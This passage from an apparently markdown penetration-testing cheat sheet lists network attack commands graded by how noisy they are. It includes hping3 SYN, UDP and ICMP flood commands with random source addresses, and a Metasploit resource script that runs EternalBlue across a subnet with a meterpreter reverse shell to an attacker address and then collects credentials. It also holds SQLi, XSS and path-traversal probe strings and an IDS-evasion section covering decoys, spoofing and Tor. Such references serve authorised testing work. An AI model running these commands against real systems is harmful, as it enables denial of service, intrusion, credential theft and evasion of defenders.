  203.0.113.0/24 -oA nmap_insane_full

# Parallel nmap against multiple hosts simultaneously (GNU parallel)
cat alive_hosts.txt | parallel -j 50 \
  "sudo nmap -sS -sV -O -T5 -p- --open {} -oA nmap_{}"

# Windows
# Run nmap with -T5 from CMD
nmap -T5 -sV -sC -p- 203.0.113.0/24 --open
```

---

### 10.3 — hping3 — Packet Flood for DoS Testing

**Packets sent:** `Unlimited (flood)` | **Packet type:** Configurable — SYN flood, UDP flood, ICMP flood | **Detectable:** Immediately — will trigger DDoS protection

```bash
# ⚠️ ONLY with explicit DoS/DDoS resilience testing in scope

# SYN Flood — test rate limiting and syn-cookie effectiveness
sudo hping3 -S --flood -p 80 203.0.113.45

# UDP Flood to port 53 (DNS amplification test)
sudo hping3 --udp --flood -p 53 203.0.113.45

# ICMP Flood (smurf-style — ping flood)
sudo hping3 --icmp --flood 203.0.113.45

# Fragmented packet flood (IDS reassembly stress test)
sudo hping3 -S --flood -f -p 80 203.0.113.45

# Random source IPs (distributed simulation)
sudo hping3 -S --flood --rand-source -p 80 203.0.113.45
```

---

### 10.4 — Full Metasploit Automation (db autopwn-style)

**Packets sent:** `Millions across all modules` | **Packet type:** Exploit-specific — all malicious | **Detectable:** Immediately

```bash
# Metasploit resource script — run all relevant modules automatically
cat > autopwn.rc << 'EOF'
db_nmap -sS -sV -O -p- -T4 203.0.113.0/24
use auxiliary/smb/smb_ms17_010
set RHOSTS 203.0.113.0/24
run
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 203.0.113.0/24
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
run
EOF

msfconsole -r autopwn.rc

# Post-exploitation automation — run post modules on all sessions
sessions -C "run post/multi/recon/local_exploit_suggester"
sessions -C "run post/windows/gather/credentials/credential_collector"
```

---

### 10.5 — SOC Detection Test — Known Bad Indicators

**Packets sent:** `Variable` | **Packet type:** Intentionally signature-matched | **Detectable:** This IS the point — test SIEM rules and alert fidelity

```bash
# Trigger specific SIEM/IDS rules deliberately:

# 1. Nmap Xmas scan (FIN+PSH+URG — classic IDS signature)
sudo nmap -sX -T5 203.0.113.45

# 2. Generate known-bad user-agents
curl -A "sqlmap/1.0-dev" https://targetcorp.com
curl -A "Nikto/2.1.6" https://targetcorp.com
curl -A "masscan/1.0" https://targetcorp.com

# 3. Try known default credentials (triggers auth failure alerts)
ssh admin@203.0.113.45        # Common default
ssh root@203.0.113.45         # Root login attempt

# 4. Attempt SNMP v1/v2 with default strings (triggers SNMP monitoring)
snmpwalk -v1 -c public 203.0.113.45
snmpwalk -v1 -c private 203.0.113.45
snmpwalk -v1 -c community 203.0.113.45

# 5. Trigger web application firewall rules
curl "https://targetcorp.com/?id=1' OR '1'='1"   # SQLi
curl "https://targetcorp.com/?q=<script>alert(1)</script>"  # XSS
curl "https://targetcorp.com/?file=../../../../etc/passwd"  # LFI
```

---

---

## Noise-Dial Summary Reference

| Level | Name | Packets/Host | Packet Type | IDS Risk | SOC Risk |
|-------|------|-------------|-------------|----------|----------|
| db:0 | Dead Silence | 0 | None (OSINT only) | None | None |
| db:1 | Whisper | 1–10 | ICMP / UDP / Normal TCP | Negligible | None |
| db:2 | Featherweight | 2–50 | TCP SYN (half-open) / Banner Grab | Very Low | None |
| db:3 | Low Crawl | 100–500 | TCP SYN / DNS AXFR | Low | Very Low |
| db:4 | Calculated | 1,000–5,000 | TCP SYN / ARP / UDP | Medium | Low |
| db:5 | Standard | 10,000–50,000 | TCP SYN + NSE Scripts | High | Medium |
| db:6 | Active | 50,000–200,000 | Protocol-specific probes | High | High |
| db:7 | Loud | 100,000–500,000 | Auth + Vuln Probes | Very High | Very High |
| db:8 | Aggressive | 500,000+ | Maliciously crafted exploits | Certain | Certain |
| db:9 | Full Aggression | Millions (internal) | NTLM / SMB / Exploit payloads | Certain | IR Active |
| db:10 | Maximum | Unlimited flood | Flood + All exploits simultaneously | Certain | Full IR |

---

## Evasion Techniques Cheatsheet

```bash
# Fragment packets (break IDS reassembly)
nmap -f                        # 8-byte fragments
nmap --mtu 16                  # Custom MTU size

# Decoys (spoof source IPs to confuse analysts)
nmap -D RND:10 <target>        # 10 random decoys
nmap -D 1.2.3.4,5.6.7.8,ME    # Specific decoys

# Randomize scan order
nmap --randomize-hosts

# Pad packets (break byte-signature IDS)
nmap --data-length 25

# Custom TTL (evade TTL-based IDS rules)
nmap --ttl 64 <target>

# Source port spoofing (bypass misconfigured firewalls)
nmap --source-port 53          # Look like DNS traffic
nmap --source-port 80          # Look like HTTP

# Timing control
nmap -T0                       # One probe per 5 min
nmap --scan-delay 5s           # 5 second between probes
nmap --max-rate 1              # 1 packet per second max

# Use proxies / Tor
proxychains nmap -sT -Pn <target>   # SOCKS proxy (TCP connect only)
```

---

## Tools Quick Reference

| Tool | Platform | Primary Use | Noise Level |
|------|----------|-------------|-------------|
| whois, dig | Linux/Win | DNS/OSINT | db:0 |
| Shodan/Censys | Web | Passive recon | db:0 |
| ping | Linux/Win | Host alive check | db:1 |
| traceroute/tracert | Linux/Win | Path discovery | db:1 |
| nc/ncat | Linux/Win | Banner grab, manual connect | db:2 |
| nmap -T0/T1 | Linux/Win | Slow stealth scan | db:2–3 |
| nmap -sS -T3 | Linux/Win | Standard SYN scan | db:4–5 |
| nmap -sC -sV | Linux/Win | Service + script scan | db:5–6 |
| enum4linux / CME | Linux | SMB enumeration | db:6 |
| gobuster / ffuf | Linux/Win | Web dir bruteforce | db:6–7 |
| nuclei | Linux/Win | Template vuln scanning | db:7 |
| hydra / medusa | Linux/Win | Credential spraying | db:7 |
| masscan | Linux | Mass port scanning | db:8–10 |
| hping3 | Linux | Packet crafting / flood | db:8–10 |
| Metasploit | Linux/Win | Exploitation framework | db:8–10 |
| Mimikatz | Windows | Credential dumping | db:9–10 |
| impacket suite | Linux | Post-exploit / PtH | db:9–10 |

---

Use [nmaptocsv](https://github.com/maaaaz/nmaptocsv) to convert nmap outputs into CSV for reporting purposes.

For each Host, collect these informations:

 - [ ] IP Address
 - [ ] MAC Address
 - [ ] Vendor Name (OUI Lookup)
 - [ ] NetBIOS/DNS Name
 - [ ] OS Version

---

## Appendix: Nmap Options and Flags

TARGET SPECIFICATION:

`-iL <inputfilename>`: Input from list of hosts/networks


HOST DISCOVERY:

`-sn`: Only do a Ping Scan. No port scanning will be done.
`-Pn`: Treat all hosts as alive/online -- skip host discovery. 


SCAN TECHNIQUES:

`-sS/sT/sA/sW/sM`: TCP SYN/Connect()/ACK/Window/Maimon scans
`-sU`: UDP Scan
`-sN/sF/sX`: TCP Null, FIN, and Xmas scans


PORT SPECIFICATION AND SCAN ORDER:

`-p <port ranges>`: Only scan specified ports
Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
`--top-ports <number>`: Scan <number> top most common ports


SERVICE/VERSION DETECTION:

`-sV`: Probe open ports to determine service/version info
`--version-intensity <level>`: Set from 0 (light) to 9 (try all probes)


SCRIPT SCAN:

`-sC`: equivalent to `--script=default`


**WARN**: Read the scripts before running them.
`--script=<Lua scripts>`: `<Lua scripts>` is a comma separated list of directories, script-files or script-categories
`--script-args=<n1=v1,[n2=v2,...]>`: provide arguments to scripts


OS DETECTION:
`-O`: Enable OS detection
`--osscan-limit`: Limit OS detection to promising targets
`--osscan-guess`: Guess OS more aggressively


TIMING AND PERFORMANCE:

Options which take `<time>` are in seconds, or append 'ms' (milliseconds),  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).

The default timing template used is the "normal" (`-T3`).

 - `-T0` / -T paranoid 	(Deprecated)
 - `-T1` / -T sneaky 	(Deprecated)
 - `-T2` / -T polite 	(Slower)
 - `-T3` / -T normal 	(Default)
 - `-T4` / -T aggressive
 - `-T5 `/ -T insane

`--min-rate <number>`: Send packets no slower than `<number>` per second
`--max-rate <number>`: Send packets no faster than `<number>` per second

FIREWALL/IDS EVASION AND SPOOFING:

`-f`: fragment packets (optionally w/given MTU)
`-D <decoy1,decoy2[,ME],...>`: Cloak a scan with decoys
`-S <IP_Address>`: Spoof source address
`-e <iface>`: Use specified interface

`--source-port <portnum>`: Use given source port number
Some ports like 53 (DNS) or 443 (HTTPS) have a more relaxed network policy than others. So, it's good to try this out too.

`--spoof-mac <mac address/prefix/vendor name>`: Spoof your MAC address
Spoof the MAC address of a server which is whitelisted, and you're good to go.


OUTPUT:
`-oN/-oX/-oG <file>`: Output scan in normal, XML, and Grepable format, respectively, to the given filename.
`-oA <basename>`: Output in the three major formats at once
`-v`: Increase verbosity level (use -vv or more for greater effect)
`-d`: Increase debugging level (use -dd or more for greater effect)
`--reason`: Display the reason a port is in a particular state
`--open`: Only show open (or possibly open) ports
`--resume <filename>`: Resume an aborted scan
`--noninteractive`: Disable runtime interactions via keyboard

Focus on these only if you want to make the XML report into an HTML report.
`--stylesheet <path/URL>`: XSL stylesheet to transform XML output to HTML
`--webxml`: Reference stylesheet from Nmap.Org for more portable XML
`--no-stylesheet`: Prevent associating of XSL stylesheet w/XML output

MISC:
`-6`: Enable IPv6 scanning
`-A`: Enable OS detection, version detection, script scanning, and traceroute
`--send-eth/--send-ip`: Send using raw ethernet frames or IP packets
`-V`: Print version number
